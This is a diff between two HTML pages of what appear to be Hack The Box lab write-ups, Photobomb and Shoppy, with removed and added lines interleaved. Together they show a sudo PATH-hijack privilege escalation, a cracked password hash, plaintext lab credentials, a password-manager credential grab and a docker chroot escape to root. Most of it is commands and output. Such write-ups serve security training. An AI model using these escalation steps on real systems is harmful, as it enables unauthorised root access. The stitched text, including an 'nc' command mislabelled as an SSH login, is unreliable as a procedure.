-</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Josh Account:
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">User wizard may run the following commands on photobomb:
-</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
+</span></span><span class="line"><span class="cl">Hash: 6ebcea65320589ca4f2f1ce039975995
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">type: md5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">result: remembermethisway
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>It looks like in order to have the <strong>root</strong> privilage, We only have that script:</p>
-<blockquote>
-<p>/opt/cleanup.sh</p>
-</blockquote>
-<p>That we can run with the <strong>root</strong> privilage.</p>
-<p>if we have tried to run that script, We get:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/opt$ ./cleanup.sh
-</span></span><span class="line"><span class="cl">./cleanup.sh
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/voicu-apostol-MWER49YaD-M-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/masaaki-komori-NYFaNoiPf7A-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/andrea-de-santis-uCFuP0Gc_MM-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/tabitha-turner-8hg0xRg5QIs-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/nathaniel-worrell-zK_az6W3xIo-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/kevin-charit-XZoaTJTnB9U-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/calvin-craig-T3M72YMf2oc-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/eleanor-brooke-w-TLY0Ym4rM-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/finn-whelen-DTfhsDIWNSg-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/x.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/--reference=x.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/almas-salakhov-VK7TCqcZTlw-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/mark-mc-neill-4xWHIpY2QcY-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span><span class="line"><span class="cl">chown: changing ownership of <span class="s1">&#39;source_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.JPG&#39;</span>: Operation not permitted
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Let&rsquo;s see what that script do:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/opt$ cat cleanup.sh
-</span></span><span class="line"><span class="cl">cat cleanup.sh
-</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
-</span></span><span class="line"><span class="cl">. /opt/.bashrc
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /home/wizard/photobomb
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># clean up log files</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -s log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> ! <span class="o">[</span> -L log/photobomb.log <span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="k">then</span>
-</span></span><span class="line"><span class="cl">  /bin/cat log/photobomb.log &gt; log/photobomb.log.old
-</span></span><span class="line"><span class="cl">  /usr/bin/truncate -s0 log/photobomb.log
-</span></span><span class="line"><span class="cl"><span class="k">fi</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># protect the priceless originals</span>
-</span></span><span class="line"><span class="cl">find source_images -type f -name <span class="s1">&#39;*.JPG&#39;</span> -exec chown root:root <span class="o">{}</span> <span class="se">\;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The script is copying the content of the <strong>photobomb.log</strong> and put in inside <strong>photobomb.log.old</strong>.</p>
-<p>and then truncate the content from it.</p>
-<p>So, We will add <code>/bin/bash</code> in cd file and give read, write, execute permission.</p>
-<p>And then we run the file with <code>sudo</code> and set the <code>PATH</code> to <code>/tmp</code>.</p>
+</div><h3 id="ssh-reverse-shell">SSH Reverse shell</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -878,43 +597,148 @@
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wizard@photobomb:/$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/cd
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/cd
-</span></span><span class="line"><span class="cl">wizard@photobomb:/$ chmod <span class="m">777</span> /tmp/cd
-</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp/cd
-</span></span><span class="line"><span class="cl">wizard@photobomb:/$ <span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/find
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/bash&#34;</span> &gt; /tmp/find
-</span></span><span class="line"><span class="cl">wizard@photobomb:/$ chmod <span class="m">777</span> /tmp/find
-</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> /tmp/find
-</span></span><span class="line"><span class="cl">wizard@photobomb:/$ sudo <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
-</span></span><span class="line"><span class="cl">sudo <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
-</span></span><span class="line"><span class="cl">root@photobomb:/home/wizard/photobomb# id
-</span></span><span class="line"><span class="cl">id
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span><span class="line"><span class="cl">root@photobomb:/home/wizard/photobomb# <span class="nb">cd</span> /root
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root
-</span></span><span class="line"><span class="cl">root@photobomb:~# ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">root.txt
-</span></span><span class="line"><span class="cl">root@photobomb:~# cat root.txt
-</span></span><span class="line"><span class="cl">cat root.txt
-</span></span><span class="line"><span class="cl">c40917692c858d54a00xxxxxxxxxxxxxxx
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Jaeger account:
+</span></span><span class="line"><span class="cl">username: jaeger
+</span></span><span class="line"><span class="cl">password: Sh0ppyBest@pp!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">─$ nc jaeger@shoppy.htb
+</span></span><span class="line"><span class="cl">jaeger@shoppy.htb password: Sh0ppyBest@pp!
+</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 05:53:00 <span class="m">2022</span> from 10.10.14.38
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><em>Pwned</em></p>
-<p><img src="/post/Photobomb_HTB/imgs/rooted.JPG"
+</div><h4 id="usertxt">User.txt</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">b43c5028ab833b5XXXXXXXXXXXXXX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilage-escalation">Privilage Escalation</h2>
+<h3 id="sudo--l">Sudo -l</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> jaeger: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jaeger on shoppy:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User jaeger may run the following commands on shoppy:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>deploy<span class="o">)</span> /home/deploy/password-manager
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat /home/deploy/password-manager
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
+</span></span><span class="line"><span class="cl">Welcome to Josh password manager!
+</span></span><span class="line"><span class="cl">Please enter your master password: Sample
+</span></span><span class="line"><span class="cl">Access granted! Here is creds !
+</span></span><span class="line"><span class="cl">Deploy Creds :
+</span></span><span class="line"><span class="cl">username: deploy
+</span></span><span class="line"><span class="cl">password: Deploying@pp!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ssh deploy@shoppy.htb 
+</span></span><span class="line"><span class="cl">deploy@shoppy.htb password: 
+</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 06:04:57 <span class="m">2022</span> from 10.10.14.38
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>deploy<span class="o">)</span>,998<span class="o">(</span>docker<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1<span class="o">(</span>daemon<span class="o">)</span>,2<span class="o">(</span>bin<span class="o">)</span>,3<span class="o">(</span>sys<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,6<span class="o">(</span>disk<span class="o">)</span>,10<span class="o">(</span>uucp<span class="o">)</span>,11,20<span class="o">(</span>dialout<span class="o">)</span>,26<span class="o">(</span>tape<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ cat root.txt
+</span></span><span class="line"><span class="cl">e65b2ace8ff78062XXXXXXXXXXXX
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>Pwned</em>
+<img src="/post/Shoppy_HTB/imgs/Shoppy/1.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="rooted"
+		alt="pwned"
 	
 	
 ></p>
@@ -987,18 +811,18 @@
             
                 
 <article class="has-image">
-    <a href="/p/shoppy-htb-writeup/">
+    <a href="/p/photobomb-htb-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="/post/Shoppy_HTB/shoppy_htb.png" loading="lazy" data-key="" data-hash="/post/Shoppy_HTB/shoppy_htb.png"/>
+                    <img src="/post/Photobomb_HTB/photobomb_htb.jpg" loading="lazy" data-key="" data-hash="/post/Photobomb_HTB/photobomb_htb.jpg"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">Shoppy HTB Writeup</h2>
+            <h2 class="article-title">Photobomb HTB Writeup</h2>
         </div>
     </a>
 </article>
@@ -1191,21 +1015,22 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#scanning">Scanning</a>
-      <ol>
-        <li><a href="#nmap">Nmap</a></li>
-      </ol>
-    </li>
+    <li><a href="#scanning">Scanning</a></li>
     <li><a href="#enumeration">Enumeration</a>
       <ol>
-        <li><a href="#http-enumeration">HTTP Enumeration</a></li>
         <li><a href="#subdomain-enumeration">Subdomain Enumeration</a></li>
-        <li><a href="#directory-bruteforce">Directory Bruteforce</a></li>
+        <li><a href="#directory-enumeration">Directory Enumeration</a></li>
       </ol>
     </li>
     <li><a href="#exploitation">Exploitation</a>
       <ol>
-        <li><a href="#command-injection">Command Injection</a></li>
+        <li><a href="#nosql-injection">NoSQL Injection</a></li>
+        <li><a href="#hash-decryption">Hash Decryption</a></li>
+        <li><a href="#ssh-reverse-shell">SSH Reverse shell</a>
+          <ol>
+            <li><a href="#usertxt">User.txt</a></li>
+          </ol>
+        </li>
       </ol>
     </li>
     <li><a href="#privilage-escalation">Privilage Escalation</a>
